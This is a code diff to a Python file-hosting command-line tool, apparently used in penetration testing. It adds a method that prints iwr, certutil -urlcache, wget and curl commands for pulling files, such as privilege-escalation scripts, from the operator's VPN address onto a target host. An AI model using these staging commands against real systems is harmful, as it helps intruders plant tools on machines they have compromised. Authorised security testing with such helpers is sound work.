@@ -16,7 +16,6 @@ import logging
 from datetime import datetime
 import http.server as server
 
-
 # Set up logging to a file
 log_file = f"hosting_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log"
 logging.basicConfig(
@@ -109,13 +108,22 @@ class CLI(cmd.Cmd):
                 if pattern in file.lower():
                     absolute_file_path = os.path.join(root, file)
                     relative_file_path = os.path.relpath(absolute_file_path, os.getcwd())
-                    print(relative_file_path)
+                    print(f"[*] {relative_file_path}")
+                    self.show_commands(relative_file_path)
 
     # alias for search
     def do_s(self, arg):
         return self.do_search(arg)
 
-    # show commands to download
+    # print commands
+    def show_commands(self, FILE):
+        FILENAME = os.path.basename(FILE)
+        print(f"iwr -Uri http://{_VPN_IP}:{self._PORT}/{FILE} -O {FILENAME}")
+        print(f"certutil.exe -urlcache -split -f http://{_VPN_IP}:{self._PORT}/{FILE} {FILENAME}")
+        print(f"wget {_VPN_IP}:{self._PORT}/{FILE}")
+        print(f"curl -o {FILENAME} http://{_VPN_IP}:{self._PORT}/{FILE}")
+
+# show commands to download
     def do_downloads(self, arg):
         "Display commands to download from this server.\nUsage: downloads [FILE]\n\tDefault file: peas"
         args = arg.split()
